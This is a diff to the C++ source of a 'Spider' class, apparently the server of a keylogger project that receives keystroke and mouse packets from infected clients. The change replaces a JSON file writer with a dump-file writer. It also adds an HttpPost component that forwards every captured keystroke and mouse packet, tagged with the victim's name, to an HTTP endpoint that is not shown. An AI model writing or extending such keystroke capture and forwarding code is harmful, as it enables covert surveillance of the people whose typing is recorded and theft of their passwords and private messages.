@@ -15,7 +15,8 @@
 Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web)
   : _socket(socket),
     _web(web),
-    _json(new Json())
+    _dumpFile(new DumpFile()),
+    _httpPost(new HttpPost())
 {
   DEBUG_MSG("Spider created");
   _socket->handleError([this](){dieInDignity();});
@@ -62,7 +63,8 @@ void			Spider::doFirstConnection()
 	  _name = _str;
 
 	  try {
-	    _json->openFile(_name);
+	    if (_dumpFile)
+	      _dumpFile->createFile(_name);
 	  }
 	  catch (const std::exception &e) {
 	    std::cerr << e.what() << std::endl;
@@ -167,8 +169,10 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
 #endif // !DEBUG
 
   try {
-    if (_json)
-      _json->writePaquet(&paquet);
+    if (_dumpFile)
+      _dumpFile->writePaquet(&paquet);
+    if (_httpPost)
+      _httpPost->postPaquet(&paquet, _name);
   }
   catch (const std::exception &e) {
     std::cerr << e.what() << std::endl;
@@ -212,8 +216,10 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
 #endif // !DEBUG
 
   try {
-    if (_json)
-      _json->writePaquet(&paquet);
+    if (_dumpFile)
+      _dumpFile->writePaquet(&paquet);
+    if (_httpPost)
+      _httpPost->postPaquet(&paquet, _name);
   }
   catch (const std::exception &e) {
     std::cerr << e.what() << std::endl;
